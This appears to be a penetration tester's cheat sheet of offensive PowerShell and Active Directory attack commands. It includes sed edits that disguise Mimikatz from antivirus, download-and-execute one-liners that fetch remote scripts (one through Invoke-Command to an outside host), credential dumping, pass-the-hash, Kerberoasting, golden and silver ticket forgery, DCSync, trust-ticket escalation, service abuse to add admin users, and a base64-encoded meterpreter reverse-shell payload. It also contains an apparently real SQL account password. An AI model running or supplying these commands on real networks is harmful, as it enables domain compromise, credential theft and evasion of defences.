# Powershell

## Obfuscation

[How to Bypass Anti-Virus to Run Mimikatz - Black Hills Information Security](https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/)

Look for:
```Shell
sed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1
sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
 
sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1
 
sed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1
 
sed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1
 
sed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' Invoke-Mimikatz.ps1
 
sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions\$Win32Functions #\-/g" Invoke-Mimikatz.ps1
```

Alternative:

```Plaintext
powershell "IEX (New-Object Net.WebClient).DownloadString(‘http://<din ip>/powerup.ps1’);Invoke-Allchecks”
```
## Commands

##### Find groups for user
```Shell
whoami /groups 
whoami /all
```
##### Alternative:
```Shell
gpresult /R
```
##### Find information on user:
```Shell
shell net user USERNAME /domain
```

PowerView:
```Powershell
Get-DomainUser USERNAME
Get-Netuser -UserName <username>
Get-NetUser -Domain <domain>
#Get-ADUser -Identidy <user>    
#Get-ADUser -Filter * -Properties *
#Get-ADUser -Server <server>
``` 
##### Find computers where a domain admin is logged in:
```Powershell
Invoke-UserHunter -CheckAccess
Invoke-UserHunter -username <>
```
##### Run commands on remote hosts:
```Powershell
Invoke-Command(icm) -computername PC050015 -scriptblock {whoami /groups}
Invoke-Command -computername PC047147 -scriptblock {powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://rn-dk.com:80/rn'))"}
```

List all groups:
```Powershell
Get-NetGroup *admin*
Get-ADGroup -Filter {Name -like “*admin*”} | select name
```

Get all members of the Domain Admins group:
```Powershell
Get-NetGroupMember -GroupName “Domain Admins”
Get-ADGroupMember -Identity “Domain Admins” -Recursive
```

Get the group membership for a user:
```Powershell
Get-NetGroup -UserName “username”
Get-ADPrincipalGroupMembership -Identity <username>
```

Get current domain information:
```Powershell
Get-NetDomain 
Get-NetDomain -Domain <domain>
```
	
Get the current domain SID:
```Powershell
Get-DomainSID
```    
Using ActiveDirectory module:
```Powershell
Get-ADDomain
Get-ADDomain -Identity <domain>
(Get-ADDomain).DomainSID.value    
``` 
 Get domain controllers for a domain:
```Powershell    
Get-NetDomainController 
Get-NetDomainController -Domain <domain>
    
Get-ADDomainController
Get-ADDomainController -Discover -DomainName <domain>
 ```
Get all computers of the domain:
```Powershell    
Get-NetComputer
Get-NetComputer -FullData
    
Get-ADComputer -Filter * | select name
Get-ADComputer -Filter * -Properties * 
```
Get list with interesting ACL settings:
```Powershell    
Invoke-ACLScanner -ResolveGUIDs
``` 
Find out which domain I trust:
```Shell    
shell net view /DOMAIN
```
Return all domains for the current (or specified) forest:
```Powershell    
Get-ForestDomain
```    
Return domain trusts for the current domain using built in .LDAP method:
```Powershell    
Get-DomainTrust
```    
Get a list of all domain trusts for the current domain:
```Powershell    
Get-NetDomainTrust
Get-NetDomainTrust -Domain <domain>
    
Get-ADTrust -Filter *
Get-ADTrust -Identity <domain>    
```
Return all forest trusts for the current forest or a specified forest:
```Powershell    
Get-ForestTrust
    
Get-NetForestTrust
Get-NetForestTrust -Forest <forest>
    
Get-ADTrust -Filter ‘msDS-TrustForestTrustInfo -ne “$null”’
```
Get details about the current forest:
```Powershell    
Get-NetForest
Get-NetForest -Forest <forest>
    
Get-ADForest
Get-ADForest -Identify <forest>
```    
Get all domains in the current forest:
```Powershell    
Get-NetForestDomain
Get-NetForestDomain -Forest <forest>
    
(Get-ADForest).Domains
```
See which hosts are in a domain:
```Shell    
shell net view /DOMAIN:[domain]
shell net group “domain comuters” /DOMAIN
```
See which hosts are DCs for a domain:
```Shell    
shell nltest /dclist:[domain]
```
Map a NetBIOS name to an IPv4 address:
```Shell    
shell nslookup [name]
shell ping -n 1 -4 [name]
```
Map domain trusts:
```Shell    
shell nltest /domain_trusts
shell nltest /server:[address] /domain_trusts
```
##### Find all machines on the current domain and enumerate various attributes:
```Powershell    
Invoke-Netview
```
##### List shares on a host:
```Shell    
shell net view \\[name]
 ```   
##### Find shares on hosts in current domain:
```Powershell    
Invoke-ShareFinder
```
Administrator Accounts:
    Am I an admin? (Cobalt strike)
```Shell        
shell dir \\host\C$
shell at \\host
```
Where am I an admin(PowerView (dev)):
```Powershell    
Find-LocalAdminAccess
Invoke-EnumerateLocalAdmin -Verbose
```
List Sessions on a particular computer:
```Powershell    
Get-NetSession -ComputerName <computername>
```
Domain Administrators. 
has a -SearchForest flag (useful when you’re attempting to hop up a forest trust with Mimikatz and SID histories):
```Powershell    
Find-DomainUserLocation -Stealth -ShowAll | Out-File C:\filename.txt (Add pipe if result should be exported)
```
Administrators
    List administrators:
```Shell        
shell net group “enterprise admins” /DOMAIN
shell net group “domain admins” /DOMAIN
shell net localgroup “administrators” /DOMAIN
net localgroup administrator
```
Net module
```Shell        
net group \\TARGET groupname
net localgroup \\TARGET group name
```        
Local administrators (May be a domain account)
net module can query local groups and users
```Shell        
net localgroup \\TARGET
net localgroup \\TARGET groupname
```
##### PowerView can find local administrators on a host:
```Powershell        
Get-NetLocalGroup -HostName TARGET
```
   And, on every host:
```Powershell        
Find-DomainLocalGroupMember
Invoke-EnumerateLocalAdmins
```        
Find all machines on the current domain where the current user has local admin access:        
```Powershell      
Invoke-FindLocalAdminAccess        
```        
Foreign User - enumerates users who are in groups outside of the user's domain:
```Powershell      
Get-DomainForeignUser
```    
Domain Trust Mapping - this function enumerates all trusts for the current domain and then enumerates all trusts for each domain it finds:
```Powershell      
Get-DomainTrustMapping
```
It’s the start of an approach to take a user or group name and map out where the user/group has local administrator or RDP rights (“-LocalGroup Administrators” and “-LocalGroup RDP”)  on the domain.
```Powershell      
Get-DomainGPOUserLocalGroupMapping
```    
Takes a computer name and determines what users/groups have administrative access to it.
```Powershell      
Get-DomainGPOComputerLocalGroupMapping
```
Group Policy Preferences:
```Powershell      
iex (new-object net.webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1"); Get-GPPPassword
```
PowerUp:
```Powershell      
Invoke-AllChecks
```    
Sherlock:
```Powershell      
Find-AllVulns    
```    
SQL (PowerUpSQL):
```Powershell      
Get-SQLConnectionTestThreaded -Instance "srvsccmsql01,1433" -username assnt\_cmSqlAgnt -password Verba10m -verbose
```
#### Services:
##### Modify a service to add administrative user
```Powershell          
Invoke-ServiceUserAdd -ServiceName VulnSVC - UserName <> -Password
```    
##### Writes out a C# service executable that adds a user
```Powershell          
Write-UserAddServiceBinary - ServiceName VulnSVC -UserName <> -Password <>
```
##### Replace service binary for one which can add admin user
```Powershell          
Write-ServiceEXE ServiceName VulnSVC -UserName <> -Password <>
```        
##### DLL:
```Powershell  
Invoke-FindDLLHijack
    
Invoke-FindPathHijack
```
##### Token Stealing:
use ps to list processes
use steal_token [pid] to steal token 
use getuid to find out who you are
use rev2self to drop token
    
##### Beacon Automation (Cobalt Strike)
Run executable as a service
	psexec [target] [share] [listener]      - Win XP
Run PowerShell one-liner as a service:
    psexec_psh [target] [listener]
Run PowerShell one-liner with WinRM
    winrm [target] [listener]
Run PowerShell one-liner with WMI
    wmi [target] [listener]
      
      
#### Local Privilege Escalation:

##### Get services with unquoted paths and a space in their executable path:
```Powershell          
Get-ServiceUnquoted -Verbose
```    
##### Get services where the current user can write to its binary path:
```Powershell          
Get-ModifiableServiceFile -Verbose
```        
##### Get the services which current user can modify:
```Powershell          
Get-ModifiableService -Verbose    
```
#### Lateral movement protocols and tools:

##### One-to-One:
```Powershell          
New-PSSession -ComputerName <computername> 
$sess = New-PSSession -ComputerName <computername> 

Enter-PSSession -Computername <computername
Enter-PSSession -Session $sess
```    
##### One-to-Many:
```Powershell          
Invoke-Command / icm -ScriptBlock {<command>} -ComputerName <computername>
    
Invoke-Command /icm -FilePath <filepath> -ComputerName <computername>
```    
##### Stateful:
```Powershell          
$Sess = New-PSSession -ComputerName <computername>
Invoke-Command/icm -Session $Sess -ScriptBloack { $Proc = Get-Process}
Invoke-Command/icm -Session $Sess -ScriptBloack { $Proc.Name}
```
#### Mimikatz:
    
##### Local:
```Powershell              
Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -DumpCerts
```
##### Remote:
```Powershell              
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```        
##### Over-pass-the-hash:
```Powershell              
Invoke-Mimikatz -Command ‘"sekurlsa::pth /user:Administrator /domain:. /ntlm:<ntlmhash> /run:powershell.exe"’
```        
#### Token Manipulation:

##### Start a new process with token of a specific user:
```Powershell          
Invoke-TokenManipulation -ImpersonateUser -Username “domain\user”
```        
##### Start new process with token of another process:
```Powershell          
Invoke-TokenManipulation -CreateProcess “C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe” -ProcessId 500
```        
       
#### Domain Privilege Escalation:
    
##### Kerberoast:
        
Find service account:
GetUserSPNs:
https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1
            
PowerView
```Powershell              
Get-NetUser -SPN
```            
ActiveDirectory module
```Powershell              
Get-ADUser -FIlter {ServicePrincipalName -ne “$null”} -Properties ServicePrincipalName
```            
Request a ticket:
```Powershell              
Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList “<SPN you want ticket for>”
```            
Request-SPNTicket            
            
Check if the ticket has been granted
klist.exe
        
 Export all tickets using Mimikatz:
```Powershell              
Invoke-Mimikatz -Command ‘"kerberos::list /export"’
```            
Crack the service account password:
```Powershell              
python.exe .\tgsrepcrack.py .\passwords.txt ‘<kerberos fil>’      | https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
```            
Return ready to hashcat format kirb.txt:
```Powershell              
iex (new-object net.webclient).downloadstring("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1");Invoke-Kerberoast -output Hashcat | Select hash -expandproperty hash > kirb.txt
```            
hashcat:
```Powershell              
hashcat -m 13100 kirb.txt -w 3 -a 3 YOURWORDLIST.txt --force
```            

##### Kerberos Delegation:
        
Unconstrained Delegation:
```Powershell              
Get-NetComputer -UnConstrained
            
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```
Compromise unconstrained delegation server:            
```Powershell                  
Invoke-Mimikatz -Command ‘"sekurlsa::tickets /export"’
```            
Ticket can be reused:
```Powershell                  
Invoke-Mimikatz -Command ‘"kerberos::ptt C:\tickets\admin.kirbi"’
```
Constrained Delegation:            
            Enumerate users and computer with constranied delegation enabled
            
PowerView (dev):
```Powershell                  
Get-DomainUser -TrustedToAuth 
Get-DomainComputer -TrustedToAuth 
```                
ActiveDirectory module:
```Powershell                  
Get-ADObject -FIlter {msDS-AllowedToDelegateTo -ne “$null”} -Properties msDS-AllowedToDelegateTo
```                
Get cleartext password or NTLM hash of service account:
                https://github.com/gentilkiwi/kekeo
```Powershell                  
.\asktgt.exe /user:termadmin /domain:offensiveps.powershell.local /key:abc123 /ticket:termadmin.kirbi
```                
Now request TGS:
```Powershell                  
\s4u.exe /tgt:termadmin.kirbi /user:Administrator@offensiveps.powershell.local /service:cifs/ops-sqlsrvone.offensiveps.powershell.local   
```                
  Use TGS:
```Powershell                  
Invoke-Mimikatz -Command ‘"kerberos::ptt cifs.ops-sqlsrvone.offensiveps.powershell.local.kirbi"’
                
ls \\ops-sqlsrvone.offensiveps.powershell.local\c$
```
##### Persistence Techniques
    
   Golden Ticket:

  Execute mimikatz on DC:
```Powershell                  
Invoke-Mimikatz -Command ‘"lsadump::lsa /patch"’ -ComputerName <computername>
```                
On any machine:
```Powershell                  
Invoke-Mimikatz -Command ‘"kerberos:golden /User:Administrator /domain:<current domain> /sid:<domain sid> /krbtgt <krbtgt hash> /id:500 /groups:513 /ptt "’
```                
Use DCSync to get krbtgt hash:
```Powershell                  
Invoke-Mimikatz -Command ‘"lsadump::dcsync /user:ops\krbtgt"’
```                
Silver Ticket:
```Powershell                  
Invoke-Mimikatz -Command ‘"kerberos:golden /domain:<current domain> /sid:<domain sid> /target:<host> /service:cifs /rc4:<cifs - hash/ntlmhash> /id:500 /user:Administrator /ptt "’            
```            
Privilege Escalation Across Trusts:
        
Child to Forest Root using Trust Tickets:
```Powershell              
Invoke-Mimikatz -Command ‘"lsadump::trust /patch"’
```        
Inter-realm TGT can be forged:
```Powershell                  
Invoke-Mimikatz -Command ‘"Kerberos::golden /domain:<domain> /sid:<current domain sid> /sids:<sid history ....-519> /rc4:<ntlmhash of trustkey> /user:<user you want to impersonate> /service:krbtgt /target:<parent domain target> /ticket:C:\Users\Administrator\Desktop\trust_tkt.kirbi"’ 
```            
Get a TGS for a service in the target domain by using the forged trust ticket:
```Powershell                  
.\asktgs.exe C:\Users\Administrator\Desktop\trust_tkt.kirbi CIFS/ps-dc.powershell.local (DC on parent domain)           
```            
Use TGS to access the targeted service:
```Powershell                  
.\kirbikator.exe lsa .\CIFS.ps-dc.powershell.local.kirbi ls \\ps-dc.powershell.local\c$
```    
Child to Forest Root using krbtgt hash:
```Powershell              
Invoke-Mimikatz -Command ‘"lsadump::lsa /patch"’
            
Invoke-Mimikatz -Command ‘"kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<krbtgt hash> /sids:<sid history ....-519> /ticket:krb_tkt.kirbi"’
```            
On a machine of parent domain:            
```Powershell                  
Invoke-Mimikatz -Command ‘"kerberos::ptt C:\test\krb_tkt.kirbi"’
```            
We now have Enterprise Admin privileges:
```Powershell                  
ls //ps-dc.powershell.local/C$
```	
	
---
```powershell	
$command=”IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 127.0.0.1 -Lport 443 -Force”
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$encodedCommand >> output.txt
```

Plaintext passwords in network shared and object attributes:

1. PowerView:

Invoke-ShareFinder
Get-NetFileServer
Get-DFSshare

2.
findstr /s /i /m "pw" \\SHARE\PATH\*.<FILEEXTENSION>
findstr /s /i /m "pass" \\SHARE\PATH\*.<FILEEXTENSION>

findstr /s /i /m "pass" \\FileServer01\Scripts\*.ini
